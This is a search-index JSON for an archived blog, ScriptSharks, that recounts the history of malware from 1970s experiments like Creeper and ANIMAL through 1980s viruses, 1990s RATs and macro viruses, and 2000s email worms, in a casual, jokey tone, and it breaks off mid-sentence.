{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome!","text":"<p>This is the official knowledge base for Haxys Labs. Here, you will find articles, tutorials, and other resources on a variety of topics.</p>"},{"location":"#latest-articles","title":"Latest Articles","text":"<ul> <li>WIP</li> </ul>"},{"location":"ScriptSharks.com/","title":"Home","text":"<p>NOTE: This is an archive of my original content hosted at scriptsharks.com. The original site is no longer available, but I have preserved the content here for posterity.</p>"},{"location":"ScriptSharks.com/#scriptsharks","title":"ScriptSharks","text":"<p>Exploring the world of dangerous code.</p> <p>\"Every tool is a weapon, if you hold it right.\" ~Ani DiFranco, My I.Q.</p> <p>There's no getting rid of malware. Like the mythical hydra, for every strain we destroy, countless others arise in its place. Ever since John Von Neumann published the Theory of Self-Reproducing Automata in 1966, the state of the art of malware design has exploded in scope and complexity. Originally designed to ease our lives, computers have become weapons in the hands of unscrupulous threat actors.</p> <p>ScriptSharks aims to document the art and history of malware design and analysis, in the hopes that this information will help defenders to understand and prevent malware attacks in the future. It is currently the work of a single author; as such, it will grow and expand along with the author's own knowledge and skill.</p>"},{"location":"ScriptSharks.com/#news","title":"News","text":""},{"location":"ScriptSharks.com/#20221219","title":"2022.12.19","text":"<p>We've added new sections regarding HTML and JavaScript language tricks, analyzing ISO files, and the handy Unix <code>file</code> utility.</p>"},{"location":"ScriptSharks.com/#20221212","title":"2022.12.12","text":"<p>Learn about a currently-trending dropper design by building it yourself!</p>"},{"location":"ScriptSharks.com/#20221024","title":"2022.10.24","text":"<p>We've added the Design, Analysis and Tools sections. Check them out!</p>"},{"location":"ScriptSharks.com/#20220915","title":"2022.09.15","text":"<p>Check out the new Ransomware Rising article in the history section, detailing malware trends in the 2010s!</p>"},{"location":"ScriptSharks.com/#20220824","title":"2022.08.24","text":"<p>We added Millenial Malware to the history section. Spoiler: It's just so many worms, all over the place...</p>"},{"location":"ScriptSharks.com/#archives","title":"Archives","text":"<p>Visit the old news page for older updates.</p>"},{"location":"ScriptSharks.com/#disclaimer","title":"Disclaimer","text":"<p>The contents of this repository are provided as-is, without any warranty of any kind. The opinions expressed herein do not necessarily represent the views of the author or their employer. What you do with this information is your responsibility; it is the author's sincere hope that you will use this knowledge for the betterment of humanity.</p>"},{"location":"ScriptSharks.com/0x00%20History/00%20Sipping%20from%20the%20Fire%20Hose/","title":"00 Introduction","text":"<p>\"History is the study of all the world's crime.\" ~Voltaire</p>"},{"location":"ScriptSharks.com/0x00%20History/00%20Sipping%20from%20the%20Fire%20Hose/#sipping-from-the-fire-hose","title":"Sipping from the Fire Hose","text":"<p>The world is lousy with malware. It seems not a day passes without headlines decrying another ransomware attack, malware strain, or APT group. It can feel overwhelming for users and admins seeking to protect valuable data and assets. For security professionals, staying abreast of the latest developments and trends can seem an impossible task.</p> <p>How did we get here? Where did all this malware come from, and why was it created? What fresh malware does the future have in store, and is there anything we can do to stop it?</p> <p>In pursuit of answers, we should consider not only today's headlines, but the history of malware as a whole\u2014much of which is deeply rooted within a greater geopolitical context.</p> <p>The following sections aim to provide an overview of malware history, from its origins to the present day. The full timeline of malware history is beyond the scope of this website, so we must distill it, curating the most interesting and useful elements for our purpose. We hope you enjoy our selection.</p> <p>Also, much of this information is gathered from Wikipedia, which will make many college professors cringe. To those professors, I say: submit an issue on GitHub if you find a mistake in this content, and if you're feeling really generous, correct the mistake on Wikipedia. (Just be sure to cite a credible source.)</p> <p>Without further ado, let us begin.</p>"},{"location":"ScriptSharks.com/0x00%20History/01%20In%20the%20Beginning/","title":"01 In the Beginning...","text":"<p>\"I couldn't help thinking how well Cain had prospered after killing his brother: he founded the first city\u2014and, although we don't like to talk about it all that much, we are his children.\" ~Philip Gourevitch, We Wish to Inform You That Tomorrow We Will Be Killed with Our Families</p>"},{"location":"ScriptSharks.com/0x00%20History/01%20In%20the%20Beginning/#dawn-of-an-age","title":"Dawn of an Age","text":"<p>Long ago, when people wanted to count things, they had to use their fingers. For bigger numbers, they had to use their toes, too, or even borrow the fingers and toes of their neighbors. But this was untenable, so people started carving tallies into sticks and bones. In 2400 BCE, the Babylonians invented what would become the abacus. Around 100 BCE, the Antikythera Mechanism, the oldest example of an analogue computer, was used to predict astronomical events. These humble beginnings triggered humanity's undying hunger for technological advancement, which became the guiding principle behind the current \"smart everything\" era.</p> <p>In their defense, those ancient inventors couldn't have predicted ransomware when they were pushing beads about strings and building tools to track the stars. If you don't keep regular backups of essential data, don't go blaming Babylon when an email attachment wipes your drives.</p>"},{"location":"ScriptSharks.com/0x00%20History/01%20In%20the%20Beginning/#yes-that-von-neumann","title":"Yes, That von Neumann","text":"<p>In 1949, John von Neumann gave a series of lectures about the \"Theory and Organization of Complicated Automata,\" which became the basis for his \"Theory of Self-Reproducing Automata\", published in 1966. During his lifetime, von Neumann wrote over 150 papers about mathematics, physics and computing, contributed to the Manhattan Project during World War II, and promoted the policy of mutually assured destruction to deter the nuclear arms race.</p> <p>In retrospect, von Neumann's 1966 article may seem one of his less-notable achievements. Yet this paper contributed directly to the invention of the earliest examples of malicious software (the term \"malware\" wasn't coined until the '90s, over 20 years following von Neumann's paper).</p>"},{"location":"ScriptSharks.com/0x00%20History/01%20In%20the%20Beginning/#creeper-and-reaper","title":"Creeper and Reaper","text":"<p>In 1971, Bob Thomas wrote Creeper, a program designed to test the ideas proposed by von Neumann's article. Creeper migrated across PDP-10 mainframes running TENEX which were connected to ARPANET. Systems infected by Creeper would show the message \"I'M THE CREEPER; CATCH ME IF YOU CAN\" before the malware jumped to a different system on the network.</p> <p>A second variant of Creeper produced by Ray Tomlinson was altered so that instead of moving itself between systems, it would duplicate itself across systems, thus becoming the world's first computer worm. Recognizing the evil he had brought into the world, Tomlinson attempted to re-balance his karmic scales by producing Reaper, a program designed to seek out and destroy the Creeper worm.</p> <p>Unfortunately, Reaper functioned much like Creeper, spreading across PDP-10s on ARPANET. Thus, despite being the world's first anti-virus software, it also became the world's second computer worm, and the first example of software fratricide.</p> <p>Like Cain slaying Abel, the conflict between Reaper and Creeper set the stage for the present-day digital arms race, pitting malware authors against antivirus engineers in a never-ending battle for supremacy.</p> <p>Speaking of battles for digital supremacy, Creeper and Reaper also inspired the creation of Core War in 1984, a computer programming game wherein software \"warriors\" fight for dominance in a virtual computer. Warrior programs were written in \"Redcode,\" a primitive form of Assembly Language designed specifically for the game.</p> <p>Fictionalized versions of Reaper also featured as antagonists in the Japanese anime TV series Digimon. So cool.</p>"},{"location":"ScriptSharks.com/0x00%20History/01%20In%20the%20Beginning/#wascally-wabbits","title":"Wascally Wabbits","text":"<p>The first fork bomb dropped in 1974 in the form of \"Wabbit\" (or \"Rabbit,\" depending on who you ask). The program would \"fork\" itself in memory ad infinitum, draining resources until the affected systems ground to a halt. The malware earned its name from the rate at which the program reproduced.</p> <p>Fun trivia: A similar fork bomb plays a significant role in ScriptSharks history! (But that's a story for a different time.)</p>"},{"location":"ScriptSharks.com/0x00%20History/01%20In%20the%20Beginning/#think-of-an-animal","title":"Think of an Animal...","text":"<p>In 1975, John Walker created the first Trojan Horse malware as a mechanism for distributing a video game he had designed. The game was called ANIMAL, and was quite the clever iteration upon the old \"guess the animal\" games of the day. John's ANIMAL script included a bunch of nifty tricks that drew inspiration from ELIZA to present a more life-like, adaptive experience. The game was quite popular, and everyone wanted a copy. Rather than write the program to a bunch of drives and shipping them to all his buddies, John took a more creative approach. He created a subroutine, called PERVADE, which ran in the background as users were playing the game. The PERVADE subroutine would scan the system for accessible directories, checking to see whether a copy of ANIMAL existed in that directory. If not, PERVADE would create a copy of the game in that directory. Otherwise, it would check to see if the running version was newer than the saved copy, replacing older versions with newer ones. The trojan spread through the system, gaining greater access as more powerful users played the game. In time, it spread to external media, thus spreading to other systems.</p> <p>Within a month of its release, ANIMAL had spread across numerous Univac computers, eventually making its way to Univac's software development center in Minnesota. Rumor has it, Univac (the organization) inadvertently shipped software distribution tapes which contained ANIMAL. If true, this could be the first instance of a supply-chain attack (though it was, admittedly, unintentional).</p> <p>After recognizing how wide-spread ANIMAL had become, John and his associates considered how they might go about cleaning up the ANIMAL mess. They brainstormed, considered releasing a HUNTER program to spread and destroy the ANIMALs (much like Reaper before it), but in the end the problem was solved without any intervention necessary; Univac released a new Operating System, which handled filesystems in a slightly different manner. The change was minor, but it was enough to break the PERVADE subroutine, thus rendering ANIMAL toothless.</p>"},{"location":"ScriptSharks.com/0x00%20History/01%20In%20the%20Beginning/#end-of-the-beginning","title":"End of the Beginning","text":"<p>These stories are legends, indicative of the playful nature of early hackers. Many of the \"Old Guard\" reminisce about this era, when hackers were clever pranksters, driven by passion rather than malice. Alas, nothing lasts, and the 1980s witnessed an explosion of the first truly malicious malware in history.</p>"},{"location":"ScriptSharks.com/0x00%20History/02%20Malware%20Explosion/","title":"02 Malware Explosion","text":"<p>\"Ours is a world of nuclear giants and ethical infants. We know more about war than we know about peace, more about killing than we know about living. If we continue to develop our technology without wisdom or prudence, our servant may prove to be our executioner.\" ~Omar Bradley, Armistice Day Speech, 1948</p>"},{"location":"ScriptSharks.com/0x00%20History/02%20Malware%20Explosion/#the-pc-revolution","title":"The PC Revolution","text":"<p>In the early 1970s, computer manufacturers felt that the personal-use \"microcomputer\" market was too small to be profitable. Microprocessors were invented by Intel in 1971, but without hardware suppliers, computer enthusiasts had no way to put the chips to use. In 1974, Ed Roberts and his company, MITS, developed the first commercially-successful microcomputer, the Altair 8800, which was featured on the January 1975 cover of Popular Electronics magazine. The computer was sold as a kit for $397 (about $2,133 in 2022), and though it required significant technical knowledge (and did not ship pre-assembled), the kit sold thousands of orders in the first few weeks, sparking the first flames of the Personal Computer (PC) revolution.</p> <p>The first mass-produced PCs came in 1977 with the release of the Apple II, Commodore's PET 2001 and Tandy's TRS-80, deemed the \"1977 Trinity.\" With relatively simple programming languages and budget-friendly price-points, these systems significantly lowered the barrier to entry for computer technology. What had once been the purview of Governments, Corporations and Universities was now in the hands of a booming population of hobbyists, who turned their hobby into a booming new industry practically overnight. </p> <p>In the 1980s, as Bill Gates envisioned \"a computer on every desk and in every home,\" the ever-greater ubiquity of PCs led to a malware renaissance; what had once been simple experiments and pranks evolved into wide-spread, destructive attacks. Pandora's Box had been opened, and could not be closed again.</p>"},{"location":"ScriptSharks.com/0x00%20History/02%20Malware%20Explosion/#elk-cloner-and-brain","title":"Elk Cloner and Brain","text":"<p>As with its predecessors, the first major PC malware was written as a prank, designed by 15-year-old Rich Skrenta in 1982. The malware, known as Elk Cloner, was the first \"boot-sector virus\" in history, spreading across Apple II systems by infecting the boot sectors of floppy disks. When users booted their systems using an infected disk, they would inadvertently launch the virus, which would then infect every subsequent disk inserted into the computer, marking each infected disk with a \"signature\" byte, so it wouldn't reinfect the disk a second time. As with ANIMAL, Elk Cloner was first distributed alongside game software.</p> <p>Elk Cloner was incredibly contagious, spreading further than Skrenta ever imagined (or intended), largely due to users' ignorance regarding the threat of untrusted storage media. This is regarded the first large-scale computer virus outbreak in history. Recovery from the virus was somewhat difficult, as it required re-writing the boot sector of affected disks, often causing data loss. Innoculation was somewhat simpler, merely requiring a specific \"signature\" byte to be written to the disk. When Elk Cloner checked the disk to see whether it was infected, it would see the \"signature\" byte and skip the infection process.</p> <p>Four years later, \"Brain\" (another boot-sector virus) became the first IBM PC virus, working in a similar fashion to Elk Cloner. Originally designed as an anti-piracy measure, Brain infected the boot sector of floppy disks, replacing the original data with a message intended to scare users of pirated software into contacting the developers and obtaining a legitimate copy. Brain's authors included their address and phone numbers, which were soon inundated with messages from angry users worldwide who wanted the virus removed from their systems. One writer's account cited reports that over 100,000 disks were infected worldwide. That's a lot of phone calls...</p>"},{"location":"ScriptSharks.com/0x00%20History/02%20Malware%20Explosion/#agents-of-chaos","title":"Agents of Chaos","text":"<p>In December of 1986, Ralf Burger\u2014author of Computer Viruses: A High-Tech Disease\u2014created Virdem, the first file-based virus for DOS. When executed, Virdem scans nearby directories for uninfected COM files, then infects each file found with a copy of itself. It overwrites the beginning of the <code>.com</code> file with a jump to the end, where it appends and passes control to a duplicate of its own code, before jumping back to the original code's entry point. This technique ensures the original code still runs unimpaired, but only after the virus spreads.</p> <p>Virdem's official release included a guessing-game, played with the user while it infected their files. Like Brain, the virus included a message with the author's name and phone number. Ralf presented Virdem\u2014with German and English translations\u2014at the Chaos Computer Club (CCC) in Germany. His presentation inspired a host of variants, many of which omitted the guessing game entirely, or added other functionality. These variants continued evolving and spreading as late as 1993.</p>"},{"location":"ScriptSharks.com/0x00%20History/02%20Malware%20Explosion/#the-infection-spreads","title":"The Infection Spreads","text":"<p>1987 brought a host of new malware:</p> <ul> <li>Vienna, which appeared and then was neutralized\u2014a first for the IBM platform.</li> <li>Lehigh, which infected <code>command.com</code> on DOS systems, stopped on-campus at its namesake university before it could spread \"into the wild.\"</li> <li>A barrage of boot-sector viruses: Yale from the US, Stoned from New Zealand, and Ping-Pong from Italy.</li> <li>The first self-encrypting virus file, Cascade, which led IBM to develop its own antivirus products.</li> </ul> <p>The pace continued in 1988:</p> <ul> <li>Ping-Pong infected the University of Turin in Italy.</li> <li>The Festering Hate viruses for Apple ProDOS spread throughout infected systems, then destroyed all files once they could no longer spread.<ul> <li>Festering Hate was based on CyberAIDS, about which \"The Plague\"\u2014of Masters of Deception (MOD) fame\u2014published an article in the Summer 1998 issue of 2600 Magazine.</li> <li>In their article, The Plague referenced previously-unknown pseudonyms for other MOD members, including \"Cereal Killer\" and \"Rancid Grapefruit.\"</li> <li>Rafael Moreu's 1995 film, Hackers, nods to MOD by naming two characters after The Plague and Cereal Killer.<ul> <li>Fun Fact: This is every hacker's favorite movie, no matter how hard they deny it. Ask them. They'll deny it.</li> </ul> </li> <li>Not Fun Fact: Festering Hate was not the last file-destruction malware ever to be written.</li> </ul> </li> <li>The Morris Worm becomes the first worm to spread \"in the wild,\" infecting BSD hosts across the Internet by exploiting buffer overflow vulnerabilities.<ul> <li>Its author, Robert Morris, launched the malware from MIT computer systems while he was a graduate student at Cornell.</li> <li>He created the worm to see if it could be done, and launched it from MIT in the hopes that it would help his chances of studying there instead of Cornell.</li> <li>Despite his benign intentions, Morris caused up to $10 million in damage.</li> <li>He became the first felon convicted under the Computer Fraud and Abuse Act of 1986.</li> <li>He received the following punishments for his crimes:<ul> <li>Three years' probation</li> <li>400 hours of community service</li> <li>Just over $13,000 in fines</li> <li>Becoming a tenured professor at MIT</li> <li>Wealth, Fame and Success</li> </ul> </li> <li>Moral of the story: Crime doesn't pay. Except when it does.</li> </ul> </li> <li>In December, scientists in Switzerland sent a Christmas greeting to their friends at NASA in the form of the \"Father Christmas\" worm.<ul> <li>NASA was not amused.</li> </ul> </li> </ul> <p>In '89, malware authors kicked it up a notch:</p> <ul> <li>Ghostball, the first known multipartite virus.<ul> <li>At a time when most viruses chose to infect either files or boot sectors, Ghostball asked: \"\u00bfPor qu\u00e9 no los dos?\"</li> <li>They took the best parts of Vienna and Ping-Pong and created a monster.</li> </ul> </li> <li>The AIDS Trojan became the first ransomware in history.<ul> <li>The trojan scrambled directory and filename structures, but didn't actually encrypt the files.</li> <li>The ransom note requested users to send money to a P.O. box in Panama.</li> <li>Its creator, Dr. Joseph Popp, intended to donate the proceeds to AIDS research.</li> <li>Popp was detained in London, and later released to the United States.</li> </ul> </li> </ul>"},{"location":"ScriptSharks.com/0x00%20History/02%20Malware%20Explosion/#cyberpunks-not-dead","title":"Cyberpunk's Not Dead","text":"<p>The 80s was a warning, a shot across the digital bow, a bitter taste of things to come. It spoke to authors like William Gibson, Bruce Sterling and Bruce Bethke, mainstays of the Cyberpunk genre. Originally coined by Bethke, the word \"Cyberpunk\" became a banner beneath which artists expressed dire predictions about high-tech, dystopian futures. As Bill Gates espoused his vision for the future, the Cyberpunks asked:</p> <p>\"When computers are weapons, do we really want one on every desk and in every home?\"</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/","title":"03 Polymorphs, Macros and RATs! (Oh My!)","text":"<p>\"Microsoft is now talking about the digital nervous system... I guess I would be nervous if my system was built on their technology too.\" ~Scott McNealy, Co-Founder of Sun Microsystems</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#viruses-evolved","title":"Viruses, Evolved","text":"<p>In 1990, Mark Washburn developed the first family of polymorphic viruses, known as Chameleon. These viruses could alter their machine-language code (and thus their digital \"fingerprint\") without altering the functionality of the virus. This effect was achieved by packing the viral core into a wrapper using randomized encryption algorithms and keys. Washburn designed the first of these viruses, 1260 (otherwise known as V2PX), after studying the Vienna Virus's disassembled source code, published by Ralf Burger (of Virdem fame).</p> <p>AntiVirus (AV) software was in its infancy at this time, and many early AV engines used hash-based detection. Polymorphism enabled malware to evade these hash-based engines, triggering a digital \"arms race.\" AV vendors scrambled to develop new detection methods, which drove malware authors to develop new evasion techniques, which drove new detection methods, and so on.</p> <p>This cycle continues to this day.</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#michaelangelo","title":"Michaelangelo","text":"<p>In 1991, Australian researchers discovered the Michaelangelo Virus, designed to infect DOS machines. The virus operated on the BIOS level, infecting systems' boot sectors and spreading to any mounted floppy disks. After infection, it would lay dormant, infecting any inserted floppy disks but otherwise not taking any actions. The virus was set to \"detonate\" every year on March 6th, at which point it would corrupt any attached storage media. While the data on the drives technically wasn't wiped, their partition maps were corrupted, making file recovery impossible for average users.</p> <p>Much ado was made about this virus, particularly after January of 1992, when hardware and software vendors accidentally shipped infected products to consumers. As the virus made headlines, John McAfee (creator of McAfee Antivirus) and other tech \"experts\" stoked the flames, claiming that millions of computers could be infected with the virus\u2014despite known infections being limited to a few hundred systems. Users were advised not to use their computers on March 6th, or to fiddle with their computers' clocks on March 5th and 7th to avoid the date landing on the 6th. This advice was largely disregarded, and on March 6th, 1992, only ten to twenty thousand cases of data loss were reported. The last known Michaelangelo infection was in 1997.</p> <p>This was one of the earliest cases of \"branded\" malware getting mass-publicity and causing undue panic, despite having a relatively low impact. This tradition continues to this day, with new \"branded\" malware and vulnerabilities making headlines every year, followed by countless vendors using the subsequent panic to promote their \"cutting-edge\" security products.</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#macro-viruses","title":"Macro Viruses","text":"<p>In 1995, the same year that the greatest movie of all time was released to adoring theater audiences, the Concept virus became the first known example of a Macro Virus, abusing Microsoft Word's built-in macro-scripting language to infect documents and take unwanted actions on systems.</p> <p>In 1996, XML.Laroux was the first Microsoft Excel macrovirus. These viruses were the first viruses designed to infect documents, rather than executable files, and they were the first cross-platform viruses, capable of running on any system with Microsoft Office installed.</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#nobody-is-safe","title":"Nobody is Safe","text":"<p>1996 also saw the release of the Staog virus, the first computer virus written for Linux. Fortunately, the vulnerabilities exploited by the virus were patched quickly, and the virus died off with little fanfare. In the years since, there have been numerous Linux malware discovered in the wild, yet Linux users continue to proudly boast: \"I don't need antivirus; I run Linux.\" (They're not alone; macOS users make the same boast.)</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#knock-knock","title":"Knock, Knock","text":"<p>As if macro viruses and Linux viruses weren't enough, 1996 also brought NokNok 5.0, the first (that I'm aware of) Remote-Access Trojan (RAT).</p> <p>Tools for remote desktop access have been around since the early '80s, with software like Carbon Copy and Timbuktu leading the pack. These tools were designed for legitimate use, and made no attempt to evade detection or deceive users.</p> <p>NokNok changed the game, providing remote control capabilities in a discreet package which could be installed without victims' knowledge. This was typically achieved via the Trojan Horse technique, wherein a malicious payload is attached to a legitimate, desirable application.</p> <p>This technique is a form of Social Engineering, much like its mythical namesake, and has seen widespread popularity among file-sharing and piracy communities, where users often seek free \"cracked\" copies or dodgy \"key generators\" (\"keygens\") for expensive legitimate software.</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#cih-the-space-filler","title":"CIH, the Space-Filler","text":"<p>In 1998, the CIH virus infected sixty million computers worldwide, destroying data and, in many cases, erasing the system BIOS. The virus caused an estimated US$1 billion in damages, yet no charges were filed against its author, Chen Ing-hau, who claimed that he wrote the virus to challenge the AV industry's bold detection claims. He and a fellow student, Weng Shi-hao, co-authored an antivirus, enabling users to safely remove CIH from infected systems.</p> <p>At the time CIH was released, many viruses would prepend or append their viral code to the files they infected, resulting in changes to the size of the infected files. AV vendors caught on to this, and created detections for file-size alterations. To defeat this detection mechanism, the CIH authors developed a method to infect files without altering their size.</p> <p>When languages like C++ or Rust are compiled to binary, assemblers often include \"gaps\" of unused bytes in the executable file, padding sections to ensure proper byte alignment. The CIH virus would write its code into these gaps, thus infecting the file without altering its size.</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#plague-of-rats","title":"Plague of RATs","text":"<p>Following NokNok, RATs became a hot commodity. In 1998, the Cult of the Dead Cow (cDc) released Back Orifice (BO), a tool they designed to demonstrate the insecurity of Windows systems. Despite claims that it was intended only for legitimate uses, the tool employed evasive tactics and could be installed without user interaction, making it perfect for use as a Trojan.</p> <p>In 1999, cDc released Back Orifice 2000 (BO2k), the successor to their previous year's release. BO2k added support for Windows NT, 2000 and XP, and employed a plugin architecture, enabling new functionality to be pushed to clients on-the-fly. As before, BO2k was touted as a legitimate tool. Here are a few of the plugins provided by the tool:</p> <ul> <li>Remote control of mouse and keyboard.</li> <li>Remote observation of the user's desktop and audio.</li> <li>Rootkit behavior, capable of hiding things from the system.</li> <li>Bypass firewalls via tunneling.</li> <li>Route through \"connection chains\" of multiple infected hosts.</li> <li>Live keylogging.</li> <li>Clientless Command-and-Control (C2) via IRC.</li> </ul> <p>With features like these, it's no surprise that BO2k was classified as malware in most AV engines.</p> <p>Following on BO2k's coattails, Sub7 was also released in 1999, and swiftly became one of the most popular RATs in the world. Much like BO2k, Sub7 was designed for trojanized installation, and provided a variety of similar features:</p> <ul> <li>Remote control and observation.</li> <li>Recovering cached passwords.</li> <li>ICQ account takeover.</li> <li>C2 via IRC.</li> <li>Keylogging.</li> <li>Port scanning and redirection.</li> </ul> <p>Sub7 also included some \"prank\" features, making it popular among skids:</p> <ul> <li>Open and close the CD tray.</li> <li>Swap mouse buttons.</li> <li>Use text-to-speech to make the computer speak.</li> </ul> <p>In the decades folowing the release of BO2k and Sub7, the popularity and proliferation of RATs has soared, and the focus has shifted from pranks to profits.</p>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#outlook-look-out","title":"Outlook, Look Out","text":"<p>In 1999, a variety of malware was released which took advantage of Microsoft products, including Outlook, Outlook Express, and Office.</p> <ul> <li>The Happy99 worm wished users Happy New Year while infecting outbound emails.</li> <li>The Melissa worm was a macro virus which spread via Microsoft Office documents attached to infected emails.<ul> <li>The documents appeared to contain login credentials for a number of pornographic websites, designed to entice users to open the file.</li> </ul> </li> <li>The ExploreZip worm was discovered. It was designed to destroy Microsoft Office documents.</li> <li>The Kak worm, written in JavaScript, spread by exploiting a bug in Outlook Express.</li> </ul>"},{"location":"ScriptSharks.com/0x00%20History/03%20The%2090s/#shattering-windows","title":"Shattering Windows","text":"<p>In the years following the release of Windows 3.0, Microsoft became the global leader in the desktop OS market. Much to the chagrin of Mac and Linux users, Microsoft's products became the most wide-spread software in the world, despite being plagued by vulnerabilities and malware. To this day, the vast majority of malware targets Microsoft Office and Windows. These products continue to be the most common route for malware to infect systems and networks, whether via exploitation of 0-day vulnerabilities, or simply by abusing the built-in functionality of the software. In fact, one could argue that the single most effective way to prevent malware infections would be to eliminate all Microsoft products from your workplace.</p> <p>Still, Microsoft's global market dominance continues unabated. In fact, they now offer Microsoft Defender, a clever way to turn Microsoft's historically bug-ridden software into yet another revenue source. Defender protects Windows systems against malware which, historically, abuses Microsoft's own products to infect and spread.</p> <p>Microsoft creates and sells exploitable products, then creates and sells exploit protection.</p> <p>That's like if Kia sold cars that sometimes exploded, then sold a separate add-on package that prevented the explosions.</p> <p>Brilliant!</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/","title":"04 Millenial Malware","text":"<p>\"I think everybody's got a malicious side.\" ~Jonathan Rhys Meyers</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#ilu-3","title":"ILU &lt;3","text":"<p>On May 5th, 2000, overflowing with love (but too late for Valentine's Day), 24-year-old Onel de Guzman shared his \"Love Letter\" worm (ILOVEYOU) with the world, infecting over 10 million systems. The worm spread by email, containing a malicious <code>.vbs</code> attachment which trashes the user's drives before forwarding itself to all the people in their address book. Considering data loss and the cost of remediation, the worm caused an estimated US$15-24 billion in damages.</p> <p>For some reason, the world wasn't thrilled with Onel's exhuberant expression of adoration. Still, he never served time; the Philippines had no laws against writing malware at the time, so all charges were dropped. (They passed laws after-the-fact, but couldn't charge him for crimes committed prior.)</p> <p>Onel set the bar high, but malware authors love a challenge.</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#tennis-star-goes-viral","title":"Tennis Star Goes Viral","text":"<p>At the peak of her sports career, tennis star Anna Kournikova achieved super-stardom. Mixed drinks and poker hands were named after her. She had a licensed PlayStation game, released in Japan and Europe. She was so famous that between 2001 and 2003, her name was among the top most-searched terms on Google.</p> <p>Looking to cash in on that fame, 20-year-old Jan de Wit released the Vbs.OnTheFly worm\u2014known more widely as the \"Anna Kournikova virus\"\u2014in February of 2001. Like the ILOVEYOU worm, the virus used a <code>.vbs</code> email attachment\u2014masquerading as a risque photo of the namesake tennis star\u2014to infect the system. Like its predecessor, the worm would send itself to everyone in the user's Outlook address book. Unlike its predecessor, the worm did not cause any damage to systems it infected.</p> <p>The worm infected millions of systems and caused problems in email servers worldwide. But here's the kicker... de Wit didn't hand-craft OnTheFly. He used a simple online VBS Worm Generator tool, originally created by an Argentinian hacker called [K]Alamar. He created the worm to see whether security had improved in the year following the ILOVEYOU worm. (Clearly it hadn't.) He attributed the worm's success to the world's unhealthy obsession with Kournikova.</p> <p>Jan served 150 hours of community service.</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#worms-of-mass-destruction","title":"Worms of Mass Destruction","text":"<p>2001 saw a flood of additional worms:</p> <ul> <li>Magistr, a sophisticated email worm targeting people in the legal profession.</li> <li>Sadmind, which spread by exploiting Sun Solaris and Microsoft IIS.</li> <li>Sircam, which spread through Microsoft systems via email and unprotected network shares.</li> <li>Code Red, which spread via Microsoft IIS exploits.</li> <li>Code Red II, because everybody loves a good sequel.</li> <li>Nimda, which spread not only via Windows exploits, but via existing Code Red II and Sadmind infections.</li> <li>Klez, which exploited Microsoft Internet Explorer, Outlook, and Outlook Express.</li> </ul> <p>2002 had a nice change of pace, starting with the Simile virus, written in Assembly by \"Mental Driller.\" The virus would lay dormant, activate on a semi-random date, show a \"Free Palestine\" message, then completely rebuild itself, shuffling around its code prior to infecting random files on the system. This resulted in a constantly-changing viral fingerprint, which made the malware remarkably resilient and difficult to detect.</p> <p>Following Simile, 2002 brought Beast (yet another RAT), then skipped right back to worms with Mylife, which spread via... can you guess? That's right! A <code>.vbs</code> email attachment that forwards itself to everyone in the user's Outlook address book.</p> <p>Nobody said malware authors had to be original.</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#worms-without-borders","title":"Worms Without Borders","text":"<p>In 2003, aside from a couple RATs, it was worms all the way down:</p> <ul> <li>SQL Slammer, spreading via Microsoft SQL Server.</li> <li>Blaster, exploiting Windows system services.</li> <li>Welchia, which attempts to remove Blaster and patch Windows. (Sounds familiar...)</li> <li>Sobig, which spread across Windows systems via email and network shares.</li> <li>Swen, daring to think different. (This one is written in C++!)</li> <li>Sober, yet another <code>.vbs</code> worm.</li> <li>Agobot, which exploited Windows vulnerabilities.</li> <li>Bolgimo, which exploited Windows vulnerabilities.</li> </ul> <p>2004 continued the trend:</p> <ul> <li>Bagle, MyDoom, Netsky, and Witty all followed closely in their predecessors' footsteps.</li> <li>Sasser exploited Windows LSASS (but removed MyDoom and Bagle).</li> <li>Caribe broke from the pack, becoming the first worm to infect mobile phones, spreading via Bluetooth.</li> <li>Santy became the first-known \"webworm,\" exploiting online forums running phpBB. It used Google to find new targets, and infected around 40,000 sites before Google filtered the malicious search query.</li> </ul> <p>The worms did not stop. Legends say they're still spreading to this very day... (Like RATs, I'll only cover notable worms from here on.)</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#corporate-rootkits-in-my-home-pc","title":"Corporate Rootkits? In My Home PC?","text":"<p>It's more likely than you'd think! While the swarm of worms continued in 2005, Sony BMG (a now-defunct music-and-entertainment venture) stole the headlines when researchers discovered two subversive rootkits designed to impede digital piracy. The rootkits hid from the system, preventing users from copying CDs, and \"phoning home\" to report on users' activity. They violated copyrights, installed without user consent, and created vulnerabilities which were exploited by unrelated malware.</p> <p>To quell the public outrage, Sony BMG released an uninstaller for one of the rootkits\u2014though the uninstaller failed to uninstall the rootkit, and actually introduced more malware and vulnerabilities onto affected systems.</p> <p>Hoping to smooth things over, Sony BMG paid out a few settlements, recalled 10% of the infected CDs, and pinky-promised they'd never do it again.</p>"},{"location":"ScriptSharks.com/0x00%20History/04%20Millenial%20Malware/#how-the-mighty-have-fallen","title":"How the Mighty Have Fallen","text":"<p>In February of 2006, Mac OS X fans\u2014who, like their Linux counterparts, had long boasted immunity to malware\u2014were dismayed by the news of a trojan (known as <code>OSX/Leap-A</code> or <code>OSX/Oompa-A</code>) designed to infect Mac systems. Fortunately, the trojan didn't pose much threat, so they\u2014like their Linux counterparts\u2014continued to boast immunity, despite evidence to the contrary.</p> <p>Following on its heels, the Stardust Macro Virus (a.k.a. \"Starbucks\") was the first macro virus for StarOffice and OpenOffice. Proponents of these office suites oft claimed that they were more secure than Microsoft Office, as they didn't employ Microsoft's VBS macro language. The Stardust virus shattered their dreams, proving that nothing 